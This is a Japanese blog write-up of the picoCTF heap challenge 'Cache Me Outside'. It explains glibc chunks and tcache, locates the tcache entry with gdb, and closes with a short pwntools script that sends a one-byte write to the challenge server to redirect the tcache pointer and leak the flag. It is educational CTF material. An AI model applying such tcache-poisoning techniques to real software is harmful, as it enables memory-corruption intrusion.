---
title: picoCTF "Cache Me Outside" writeup
date: 2021-12-24
draft: false
---

ヒープエクスプロイト系の問題を初めて自力で解いた。嬉しい。

## 事前準備

問題のバイナリ`heapedit`を即実行してもSegmentation faultしてしまう。なので一緒に与えられた`libc.so.6`でglibcのバージョンを確認する。

```
$ chmod +x ./heapedit ./libc.so.6
$ file ./heapedit 
./heapedit: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6967c296c25feb50c480b4edb5c56c234bb30392, not stripped
$ ./heapedit
Segmentation fault (core dumped)
```

```
$ ./libc.so.6
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.
Copyright (C) 2018 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 7.5.0.
libc ABIs: UNIQUE IFUNC
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
```

パッケージのバージョンが`2.27-3ubuntu1.2`と分かったので以下の手順を実行する。

* [http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/](http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/)から該当する`deb`パッケージをダウンロード
* `libc-2.27.so`と`ld-2.27.so`を取り出す
*  ファイル名を`libc-2.27.so`から`libc.so.6`に変更
* [patchelf](https://github.com/NixOS/patchelf)を使って`RPATH`とinterpreterを調整する

これらを`patch.sh`というファイル名で以下のシェルスクリプトにまとめた。

```
#!/bin/bash
set -euxo pipefail
cd $(dirname "$0")

PWD=$(pwd)
LIBC6="libc6_${GLIBC_VERSION}-${DEBIAN_REVISION}_${CPU_ARCH}"
SOURCE_DIR="${PWD}/${LIBC6}"
NAME_LIBC6_BINARY="libc.so.6"
NAME_LD_BINARY="ld-${GLIBC_VERSION}.so"
PACKAGE_NAME="${LIBC6}.deb"
PACKAGE_URL="http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/${PACKAGE_NAME}"

if [[ ! -f "${SOURCE_DIR}/${NAME_LIBC6_BINARY}" ]] || \ 
   [[ ! -f "${SOURCE_DIR}/${NAME_LD_BINARY}" ]]; then
    # Prepare
    rm -rf "./lib" "./data.tar.xz" "${PACKAGE_NAME}" "${SOURCE_DIR}"
    mkdir ${SOURCE_DIR}

    # Download and unarchive
    wget "${PACKAGE_URL}"
    ar -xv "${PACKAGE_NAME}" "data.tar.xz"
    tar -xvf "./data.tar.xz" "./lib/x86_64-linux-gnu/libc-${GLIBC_VERSION}.so"
    tar -xvf "./data.tar.xz" "./lib/x86_64-linux-gnu/ld-${GLIBC_VERSION}.so"

    # libc
    mv "./lib/x86_64-linux-gnu/libc-${GLIBC_VERSION}.so" "${SOURCE_DIR}/${NAME_LIBC6_BINARY}"

    # ld
    mv "./lib/x86_64-linux-gnu/ld-${GLIBC_VERSION}.so" "${SOURCE_DIR}/${NAME_LD_BINARY}"

    # Remove unnecessary dirs
    rm -rf "./lib" "./data.tar.xz" "${PACKAGE_NAME}"
fi

# Patch
patchelf --set-rpath "${SOURCE_DIR}" --set-interpreter "${SOURCE_DIR}/${NAME_LD_BINARY}" "${TO_PATCH}"

# Check
echo "Check libc and ld."
echo ""
LD_TRACE_LOADED_OBJECTS=1 "${TO_PATCH}"

exit 0
```

```
$ GLIBC_VERSION=2.27 CPU_ARCH=amd64 DEBIAN_REVISION=3ubuntu1.2 TO_PATCH=./heapedit ./patch.sh
```

これでもSegmentation faultしてしまうので`ltrace`で挙動を追うと、`flag.txt`が無いことが原因のようなのでファイルを追加。

```
$ ./heapedit 
Segmentation fault (core dumped)
```

```
$ ltrace ./heapedit 
setbuf(0x7fd8db03a760, 0)                                                                   = <void>
fopen("flag.txt", "r")                                                                      = 0
fgets( <no return ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

```
$ echo -n picoCTF{flag} > flag.txt
```

```
$ ./heapedit 
You may edit one byte in the program.
Address: 
```

ようやく問題のバイナリが動くようになった。

## 問題を見る

```
$ pwn checksec ./heapedit 
[*] '/root/workspace/pico_ctf/Cache_Me_Outside/heapedit'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fd000)
    RUNPATH:  b'/root/workspace/pico_ctf/Cache_Me_Outside/libc6_2.27-3ubuntu1.2_amd64'

```

デコンパイルした結果を示す。

```
undefined8 main(int argc, char **argv)
{
    undefined8 uVar1;
    int64_t in_FS_OFFSET;
    char **var_c0h;
    int var_b4h;
    undefined var_a1h;
    int32_t var_a0h;
    int32_t var_9ch;
    uint64_t var_98h;
    char *ptr;
    FILE *stream;
    char *var_80h;
    char *s;
    char *var_70h;
    int64_t var_68h;
    int64_t var_60h;
    int64_t var_58h;
    char *s2;
    int64_t canary;

    canary = *(int64_t *)(in_FS_OFFSET + 0x28);
    sym.imp.setbuf(_reloc.stdout, 0);
    stream = (FILE *)sym.imp.fopen("flag.txt", 0x400b08);
    sym.imp.fgets(&s2, 0x40, stream);
    var_70h = (char *)0x2073692073696874;
    var_68h = 0x6d6f646e61722061;
    var_60h = 0x2e676e6972747320;
    var_58h._0_1_ = 0;
    var_98h = 0;
    for (var_9ch = 0; var_9ch < 7; var_9ch = var_9ch + 1) {
        ptr = (char *)sym.imp.malloc(0x80);
        if (var_98h == 0) {
            var_98h = (uint64_t)ptr;
        }
        *(undefined8 *)ptr = 0x73746172676e6f43;
        *(undefined8 *)((int64_t)ptr + 8) = 0x662072756f592021;
        *(undefined8 *)((int64_t)ptr + 0x10) = 0x203a73692067616c;
        *(undefined *)((int64_t)ptr + 0x18) = 0;
        sym.imp.strcat(ptr, &s2);
    }
    var_80h = (char *)sym.imp.malloc(0x80);
    *(undefined8 *)var_80h = 0x5420217972726f53;
    *(undefined8 *)((int64_t)var_80h + 8) = 0x276e6f7720736968;
    *(undefined8 *)((int64_t)var_80h + 0x10) = 0x7920706c65682074;
    *(undefined4 *)((int64_t)var_80h + 0x18) = 0x203a756f;
    *(undefined *)((int64_t)var_80h + 0x1c) = 0;
    sym.imp.strcat(var_80h, &var_70h);
    sym.imp.free(ptr);
    sym.imp.free(var_80h);
    var_a0h = 0;
    var_a1h = 0;
    sym.imp.puts("You may edit one byte in the program.");
    sym.imp.printf("Address: ");
    sym.imp.__isoc99_scanf(0x400b48, &var_a0h);
    sym.imp.printf("Value: ");
    sym.imp.__isoc99_scanf(0x400b53, &var_a1h);
    *(undefined *)((int64_t)var_a0h + var_98h) = var_a1h;
    s = (char *)sym.imp.malloc(0x80);
    sym.imp.puts(s + 0x10);
    uVar1 = 0;
    if (canary != *(int64_t *)(in_FS_OFFSET + 0x28)) {
        uVar1 = sym.imp.__stack_chk_fail();
    }
    return uVar1;
}
```

### 要約

* `malloc(0x80)`の戻り値を変数`ptr`に格納して、`ptr`に対してフラグを書き込む。
* 7回書き直される`ptr`のうち、一番最初の`malloc(0x80)`の戻り値で得たアドレスを変数`var_98h`に格納する
* もう一度`malloc(0x80)`を呼んで戻り値を変数`var_80h`に格納して、ダミーの文字列を書き込む
* `free(ptr)`する
* `free(var_80h)`する
* `scanf`関数を2回実行して標準入力からアドレスを10進数、値を1バイト読み込む
* `*(var_98h + 入力されたアドレス) = 入力された値`とポインタを使って1バイトの書き換えを行う
* 再び`malloc(0x80)`して今度は変数`s`に格納する
* `puts(s)`でヒープの内容を表示する


## mallocの調査

9回`malloc`が呼ばれるので呼ばれた直後にブレークポイントを張って`gdb`で戻り値を確認する。マシンによって戻り値は異なるかもしれないが`PIE`が無効なので何度実行してもそのマシンの中では同じ結果になるはず。
(以下の表は上記の2回の`scanf`でどちらも`0`と入力した場合)

| 回数 | 変数      | 戻り値(アドレス) | 備考                              |
|------|-----------|------------------|-----------------------------------|
|  1   | `ptr`     | 0x6034a0         | `var_98h`にも格納                 |
|  2   | `ptr`     | 0x603530         |                                   |
|  3   | `ptr`     | 0x6035c0         |                                   |
|  4   | `ptr`     | 0x603650         |                                   |
|  5   | `ptr`     | 0x6036e0         |                                   |
|  6   | `ptr`     | 0x603770         |                                   |
|  7   | `ptr`     | 0x603800         | `free`1回目、フラグがある         |
|  8   | `var_80h` | 0x603890         | `free`2回目、ダミーの文字列がある |
|  9   | `s`       | 0x603890         | `puts`で表示                      |

注目したいのは8回目と9回目の`malloc`で得られた戻り値が同じである点。

## ヒープについて

### チャンク

glibcはヒープを扱う際、チャンク(chunk)と呼ばれる単位でメモリを管理する。チャンクはサイズによって扱いが異なるときがあるが、今回は`malloc`の引数が全て`0x80`なので同一サイズのチャンクが扱われる。
`malloc`は引数の値を満たすサイズのチャンクを探しにいくが、チャンク自体の大きさは引数に指定されたものよりも`0x10`バイト大きいものになる。これはチャンクの先頭`0x10`バイトには「直前のチャンクのサイズ」と「現在のチャンクのサイズ + チャンクに関するフラグ」があるため。なので9回目以外の`malloc`の戻り値の差は`0x90`バイトになる。(ユーザーが扱えるのは`0x80`バイト)

glibcのソースコードにも以下のように記されている。

[malloc_chunk](https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L1054)

```
/*
  This struct declaration is misleading (but accurate and necessary).
  It declares a "view" into memory allowing access to necessary
  fields at known offsets from a given base. See explanation below.
*/

struct malloc_chunk {

  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};
```

```
   An allocated chunk looks like this:


    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             Size of previous chunk, if unallocated (P clear)  |
	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             Size of chunk, in bytes                     |A|M|P|
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             User data starts here...                          .
	    .                                                               .
	    .             (malloc_usable_size() bytes)                      .
	    .                                                               |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             (size of chunk, but used for application data)    |
	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             Size of next chunk, in bytes                |A|0|1|
	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

```

### tcache

`malloc`でアロケートされたチャンクが`free`されたとき、その領域をプールする場所として候補に上がるのが`tcache`になる。
`tcache`はスレッドごとに用意された構造体で、`entries`メンバーでは開放されたチャンクへのポインタの配列が定義されている。


[tcache](https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L2921)
```
static __thread tcache_perthread_struct *tcache = NULL;
```

[tcache_perthread_struct](https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L2909)
```
/* There is one of these for each thread, which contains the
   per-thread cache (hence "tcache_perthread_struct").  Keeping
   overall size low is mildly important.  Note that COUNTS and ENTRIES
   are redundant (we could have just counted the linked list each
   time), this is for performance reasons.  */
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```

[tcache_entry](https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L2902)
```
/* We overlay this structure on the user-data portion of a chunk when
   the chunk is stored in the per-thread cache.  */
typedef struct tcache_entry
{
  struct tcache_entry *next;
} tcache_entry;
```

解放されたチャンクが`tcache`へ移る場合、そのチャンクは`tcache`の`entries`メンバーの中でサイズ別に割り当てられた単方向のリンクリスト作る。このリンクリストでは、後で`free`されたチャンクがリンクリストの先頭に来るようになっている。今回の例で当てはてめると7回目と8回目の`malloc`で確保されたチャンクが`free`されたので図にすると以下のようになる。

![two chunks in tchace](/img/2021-12-24-picoCTF-Cache-Me-Outside-writeup/two-chunks-in-tcache.png)

この状態で`malloc(0x80)`を呼ぶと、`tcache`の`entries`にある`0x603890`のチャンクが返る。しかし、このチャンクにはダミーの文字列が入っているので後に呼ばれる`puts`関数で表示されるのはダミーの文字列になってしまう。だから、理想としては`tcache`の`entries`をフラグが格納されている`0x603800`のチャンクに直接書き換えたい。そうすれば`puts`でフラグの表示ができるようになる。

![fixed chunks in tchace](/img/2021-12-24-picoCTF-Cache-Me-Outside-writeup/fixed-chunks-in-tcache.png)

## 解法

この書き換えをするためにデコンパイルして見つけた`*(var_98h + 入力されたアドレス) = 入力された値`を使う。
まず`gdb`を利用して、`tcache`の`entries`の先頭にある`0x603890`が格納されているアドレスを探す
 
 ```
$ gdb -q ./heapedit 
 GEF for linux ready, type `gef' to start, `gef config' to configure                                                                                  
96 commands loaded for GDB 9.2 using Python engine 3.8                                                                                               
Reading symbols from ./heapedit...                                        
(No debugging symbols found in ./heapedit)                                
gef➤  b *0x00400a29                                                        
Breakpoint 1 at 0x400a29
gef➤  r
Starting program: /root/workspace/pico_ctf/Cache_Me_Outside/heapedit 
You may edit one byte in the program. 
Address: 0
Value: 0

(snip...)

 gef➤  search-pattern 0x603890
[+] Searching '\x90\x38\x60' in memory
[+] In '[heap]'(0x602000-0x623000), permission=rw-
  0x602088 - 0x602094  →   "\x90\x38\x60[...]" 
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffe070 - 0x7fffffffe07c  →   "\x90\x38\x60[...]" 
  0x7fffffffe470 - 0x7fffffffe47c  →   "\x90\x38\x60[...]" 
gef➤  x/g 0x602088
0x602088:       0x603890
gef➤  
 ```

### 書き換えるアドレス

 `tcache`に格納された最初のチャンクへのポインタが`0x602088`にあることがわかる。だから書き換えたいアドレスは`0x602088`になる。`var_98h`の値は`0x6034a0`と分かっているので、`0x602088`にするためにはアドレス部に`0x602088 - 0x6034a0`つまり`-5144`を入力すれば良い。

### 書き換える値

 一方、値の部分では`0x603890`を`0x603800`にしたい。求めたアドレスの`0x602088`はポインタの最下位バイトにあたるので、null終端文字である`\x00`を入力すれば書き換えが可能になる。

## 解答

```
#!/usr/bin/env python3
from pwn import *

context(os = 'linux', arch = 'amd64')

def main():
    conn = remote('mercury.picoctf.net', 36605)
    conn.recvuntil(b'Address: ')
    conn.sendline(b'-5144')
    conn.recvuntil(b'Value: ')
    conn.sendline(b'\x00')
    print(conn.recvline()[:-1])

if __name__ == '__main__':
    main()
```

## 参考
* [MallocInternals](https://sourceware.org/glibc/wiki/MallocInternals)
* [malloc.c](https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c)
* [shellphish/how2heap](https://github.com/shellphish/how2heap)